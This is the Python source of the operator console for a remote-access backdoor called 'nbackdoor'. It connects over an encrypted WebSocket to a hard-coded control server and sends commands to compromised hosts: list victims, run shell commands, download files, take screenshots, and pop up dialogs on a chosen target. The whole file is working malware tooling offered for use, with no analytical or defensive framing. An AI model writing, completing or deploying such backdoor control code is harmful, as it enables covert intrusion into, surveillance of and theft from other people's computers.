#!/usr/bin/env python
# -*- coding: utf-8 -*-
import shlex
import os
from colorama import init
from colorama import Fore, Back, Style
import uuid
import json
import time
from base64 import b64decode, b64encode
from websocket import create_connection
from Crypto.Cipher import AES
__author__ = 'nekocode'


class ControllerClient:
    def __init__(self):
        self.SERVER_HOST = 'ws://192.168.10.3:8888'
        self.HOST_NAME = hostname()
        self.UUID = str(uuid.uuid5(uuid.NAMESPACE_DNS, str(uuid.getnode())))
        self.IV = '\0' * AES.block_size
        self.SECRET = os.urandom(32)
        self.ws = None

        self.exit = False

    def run(self):
        while not self.exit:
            try:
                print 'Trying to connect server...'
                self.ws = create_connection(self.SERVER_HOST)
                print 'Connected!'

                pwd = raw_input('Enter the password: ')

                try:
                    sercret_msg = {'uuid': self.UUID, 'host_name': self.HOST_NAME, 'secret': b64encode(self.SECRET),
                                   'pwd': self.encrypt(pwd)}
                    self.ws.send(json.dumps(sercret_msg))
                except Exception as e:
                    print 'Connection lose.'
                    continue

                msg = json.loads(self.decrypt(self.ws.recv()))
                if 'data' not in msg:
                    continue
                data = msg['data']
                if data == 'login failed':
                    print Fore.RED + 'Login failed.'
                    self.exit = True
                else:
                    print Fore.RED + 'Login success!'

                while not self.exit:
                    input_str = raw_input(Back.RED + 'nbackdoor:' + Back.RESET + ' ')
                    msg = self.command_to_msg(input_str)

                    if msg:
                        self.ws.send(self.encrypt(msg))
                        msg = json.loads(self.decrypt(self.ws.recv()))
                        if 'data' in msg:
                            data = msg['data']
                            print Fore.GREEN + data

                self.ws.close()

            except Exception as e:
                if e.message:
                    print e.message
                if self.ws:
                    self.ws.close()
                time.sleep(3)

    def command_to_msg(self, input_str):
        input_array = shlex.split(input_str)
        command_str = input_array[0]
        arguments_str = input_array[1:]
        # args_str = input_array[1:]

        command = None

        if command_str == 'help':
            pass

        elif command_str == 'list':
            command = 'list'

        elif command_str == 'cmd':
            command = 'cmd'

        elif command_str == 'download':
            command = 'download'

        elif command_str == 'dialog':
            return self._arg2(command_str, arguments_str)

        elif command_str == 'screen':
            command = 'screen'

        elif command_str == 'exit':
            self.exit = True
            return None

        else:
            print 'Not available command.\n'
            return None

        return json.dumps({'cmd': command})

    @staticmethod
    def _arg2(command, arguments_str):
        json_obj = {'cmd': command}

        if len(arguments_str) >= 2:
            target = arguments_str[0]
            if target.isdigit():
                json_obj['to'] = target
                json_obj['data'] = arguments_str[1]
                return json.dumps(json_obj)
            else:
                print 'Traget argument must be int.\n'
        else:
            print 'Too few arguments.\n'

        return None

    def encrypt(self, text):
        encryptor = AES.new(self.SECRET, AES.MODE_CFB, self.IV)
        ciphertext = encryptor.encrypt(text)
        return b64encode(ciphertext)

    def decrypt(self, ciphertext):
        decryptor = AES.new(self.SECRET, AES.MODE_CFB, self.IV)
        plain = decryptor.decrypt(b64decode(ciphertext))
        return plain


def hostname():
    sys = os.name

    if sys == 'nt':
        return os.getenv('computername')
    elif sys == 'posix':
        host = os.popen('echo $HOSTNAME')
        try:
            name = host.read()
            return name
        finally:
            host.close()
    else:
        return 'Unkwon hostname'

if __name__ == '__main__':
    init(autoreset=True)
    client = ControllerClient()
    while not client.exit:
        client.run()


